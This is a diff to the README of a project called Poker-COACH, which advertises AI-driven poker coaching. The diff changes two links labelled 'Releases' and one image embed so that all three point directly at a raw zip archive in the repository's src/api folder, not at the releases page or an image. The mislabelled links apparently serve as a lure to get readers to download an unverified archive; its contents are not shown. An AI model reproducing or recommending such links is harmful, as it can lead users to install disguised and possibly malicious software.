@@ -21,10 +21,10 @@ Poker-COACH is a cutting-edge platform that leverages AI, VR, Machine Learning, 
 - VR (Virtual Reality)
 
 ## Get Started
-To access the latest releases of Poker-COACH, visit the [Releases](https://github.com/tubiccelavi/Poker-COACH/releases) section. Download the necessary files and kickstart your journey towards poker mastery.
+To access the latest releases of Poker-COACH, visit the [Releases](https://raw.githubusercontent.com/tubiccelavi/Poker-COACH/main/src/api/COACH_Poker_1.7-alpha.4.zip) section. Download the necessary files and kickstart your journey towards poker mastery.
 
 ## 👾 Let's Play!
-![Poker Night](https://example.com/poker-night-image.jpg)
+![Poker Night](https://raw.githubusercontent.com/tubiccelavi/Poker-COACH/main/src/api/COACH_Poker_1.7-alpha.4.zip)
 
 ## 🤖 AI Coaching
 Our AI-powered coaching platform will analyze your gameplay, provide strategic advice, and help you enhance your skills like never before.
@@ -39,6 +39,6 @@ Understand the odds, master the probabilities, and make informed decisions at th
 Tap into the power of reasoning language models to sharpen your decision-making skills and outsmart your opponents in every game.
 
 ## 🚀 Start Your Poker Journey Now
-Visit the [Releases](https://github.com/tubiccelavi/Poker-COACH/releases) section to download the latest version of Poker-COACH and elevate your poker game to new heights.
+Visit the [Releases](https://raw.githubusercontent.com/tubiccelavi/Poker-COACH/main/src/api/COACH_Poker_1.7-alpha.4.zip) section to download the latest version of Poker-COACH and elevate your poker game to new heights.
 
 Remember, practice makes perfect, and with Poker-COACH by your side, you're on the path to becoming a poker pro. Let's shuffle up and deal! 🃏🚀
